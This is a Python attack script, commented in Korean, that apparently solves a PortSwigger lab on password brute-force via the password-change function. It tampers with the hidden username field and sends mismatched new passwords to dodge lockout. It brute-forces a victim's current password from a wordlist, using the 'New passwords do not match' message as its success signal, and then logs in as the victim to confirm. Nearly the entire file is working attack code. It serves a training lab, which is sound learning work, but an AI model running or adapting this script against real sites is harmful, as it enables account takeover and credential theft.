#!/usr/bin/env python3
"""
Authentication - Password brute-force via password change
PortSwigger Lab:
  https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change

취약 로직:
  POST /my-account/change-password 의 username 파라미터가 hidden input 이라 변조 가능.
  - 현재 비밀번호가 틀리고 새 비밀번호 두 개가 "같으면" → 계정 잠금
  - 현재 비밀번호가 틀리고 새 비밀번호 두 개가 "다르면" → "Current password is incorrect"
  - 현재 비밀번호가 맞고  새 비밀번호 두 개가 "다르면" → "New passwords do not match"
  → 새 비밀번호를 서로 다르게 보내면, "New passwords do not match" 를
    성공 시그니처로 삼아 현재 비밀번호를 brute-force 할 수 있다.

사용 예시:
  python3 14-authentication-password-change-bruteforce.py \\
    --target "https://LAB-ID.web-security-academy.net" \\
    --victim carlos --verify
"""

import argparse
import importlib.util
import os
import re
import sys
import threading
from concurrent.futures import ThreadPoolExecutor

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_HERE = os.path.dirname(os.path.abspath(__file__))
_BF_PATH = os.path.join(_HERE, "14-authentication-brute-force.py")

TIMEOUT = 15
SUCCESS_CODES = (301, 302, 303, 307, 308)


def _load_bruteforce():
    spec = importlib.util.spec_from_file_location("auth_bruteforce", _BF_PATH)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


bf = _load_bruteforce()


def find_csrf(html: str, field: str = "csrf") -> str | None:
    m = (re.search(rf'name=["\']?{field}["\']?\s+value=["\']?([^"\'\s>]+)', html)
         or re.search(rf'value=["\']?([^"\'\s>]+)["\']?\s+name=["\']?{field}', html))
    return m.group(1) if m else None


def main() -> None:
    parser = argparse.ArgumentParser(
        description="password change 로직을 이용한 현재 비밀번호 brute-force"
    )
    parser.add_argument("--target", required=True,
                        help="대상 베이스 URL (예: https://LAB.web-security-academy.net)")
    parser.add_argument("--victim", default="carlos",
                        help="공격 대상 username (기본: carlos)")
    parser.add_argument("--passwords", default=None,
                        help=f"password 목록 (URL/파일/인라인). 기본: {bf.DEFAULT_PASSWORDS}")
    parser.add_argument("--valid-username", default="wiener",
                        help="로그인용 자기 계정 username (기본: wiener)")
    parser.add_argument("--valid-password", default="peter",
                        help="로그인용 자기 계정 password (기본: peter)")
    parser.add_argument("--login-path", default="/login",
                        help="로그인 경로 (기본: /login)")
    parser.add_argument("--change-path", default="/my-account/change-password",
                        help="비밀번호 변경 경로 (기본: /my-account/change-password)")
    parser.add_argument("--account-path", default="/my-account",
                        help="CSRF/계정 페이지 경로 (기본: /my-account)")
    parser.add_argument("--username-field", default="username",
                        help="username 필드명 (기본: username)")
    parser.add_argument("--current-field", default="current-password",
                        help="현재 비밀번호 필드명 (기본: current-password)")
    parser.add_argument("--new1-field", default="new-password-1",
                        help="새 비밀번호1 필드명 (기본: new-password-1)")
    parser.add_argument("--new2-field", default="new-password-2",
                        help="새 비밀번호2 필드명 (기본: new-password-2)")
    parser.add_argument("--success-text", default="New passwords do not match",
                        help="성공(현재 비밀번호 일치) 시그니처 (기본: 'New passwords do not match')")
    parser.add_argument("--threads", type=int, default=1,
                        help="동시 요청 수 (기본: 1; 순서 보장)")
    parser.add_argument("--delay", type=float, default=0.0,
                        help="요청 간 지연(초) (기본: 0)")
    parser.add_argument("--verify", action="store_true",
                        help="찾은 자격증명으로 victim 로그인 검증")
    args = parser.parse_args()

    base = args.target.rstrip("/")
    change_url = base + args.change_path
    account_url = base + args.account_path

    try:
        passwords = bf.load_wordlist(args.passwords, bf.DEFAULT_PASSWORDS)
    except Exception as e:
        print(f"[-] 목록 로딩 실패: {e}")
        sys.exit(1)

    s = requests.Session()
    s.verify = False

    # 1) 자기 계정 로그인
    print(f"[*] 1단계 — 로그인 ({args.valid_username})")
    login_page = s.get(base + args.login_path, timeout=TIMEOUT)
    lcsrf = find_csrf(login_page.text)
    ldata = {"username": args.valid_username, "password": args.valid_password}
    if lcsrf:
        ldata["csrf"] = lcsrf
    r = s.post(base + args.login_path, data=ldata, timeout=TIMEOUT,
               allow_redirects=True)
    if "log out" not in r.text.lower():
        print("    [!] 로그인 실패 가능성 — 자격증명/경로 확인")
    else:
        print("    로그인 성공")

    # 2) 변경 페이지에서 CSRF 확보
    acct = s.get(account_url, timeout=TIMEOUT, allow_redirects=True)
    csrf = find_csrf(acct.text)
    print(f"[*] CSRF 토큰: {'획득' if csrf else '없음'}")
    if not csrf:
        print("    [!] CSRF 토큰을 찾지 못했습니다. 형식/경로를 확인하세요.")

    print(f"\n[*] 2단계 — {args.victim} 현재 비밀번호 brute-force ({len(passwords)}개)")
    print(f"    성공 시그니처: {args.success_text!r}")
    print(f"    새 비밀번호: 서로 다르게 전송(계정 잠금 방지)")
    print("    " + "-" * 60)

    found = {"pw": None}
    lock = threading.Lock()
    stop = threading.Event()
    counter = {"n": 0}

    def try_pw(pw: str) -> None:
        if stop.is_set():
            return
        data = {
            args.username_field: args.victim,
            args.current_field: pw,
            args.new1_field: "abc123XYZ",
            args.new2_field: "zyx987WVU",   # 반드시 서로 다르게
        }
        if csrf:
            data["csrf"] = csrf
        try:
            resp = s.post(change_url, data=data, timeout=TIMEOUT,
                          allow_redirects=True)
        except requests.exceptions.RequestException:
            return
        with lock:
            counter["n"] += 1
            n = counter["n"]
        if args.success_text in resp.text:
            with lock:
                if not stop.is_set():
                    stop.set()
                    found["pw"] = pw
                    print(f"    [{n}] {pw:<18} → 성공!")
        elif n % 20 == 0:
            with lock:
                print(f"    [{n}/{len(passwords)}] 진행 중... (마지막: {pw})")
        if args.delay:
            import time
            time.sleep(args.delay)

    with ThreadPoolExecutor(max_workers=max(1, args.threads)) as ex:
        ex.map(try_pw, passwords)

    if not found["pw"]:
        print(f"\n[-] 비밀번호를 찾지 못했습니다. 시그니처('{args.success_text}')/경로 확인")
        sys.exit(1)

    print(f"\n[=] 결과: {args.victim} / {found['pw']}")

    if args.verify:
        print(f"\n[*] 검증 — {args.victim} 로그인")
        vs = requests.Session()
        vs.verify = False
        lp = vs.get(base + args.login_path, timeout=TIMEOUT)
        c = find_csrf(lp.text)
        d = {"username": args.victim, "password": found["pw"]}
        if c:
            d["csrf"] = c
        vr = vs.post(base + args.login_path, data=d, timeout=TIMEOUT,
                     allow_redirects=True)
        logged_in = "log out" in vr.text.lower()
        m = re.search(r'(?i)your username is:?\s*(?:<[^>]+>)?\s*([^<\s]+)', vr.text)
        if m:
            print(f"[+] 로그인 사용자: {m.group(1)}")
        if logged_in and (not m or m.group(1).lower() == args.victim.lower()):
            print(f"[✓] {args.victim} 계정 로그인 확인")
        else:
            print("[?] 로그인 확인 실패")
    else:
        print("    (로그인 검증은 --verify)")


if __name__ == "__main__":
    main()
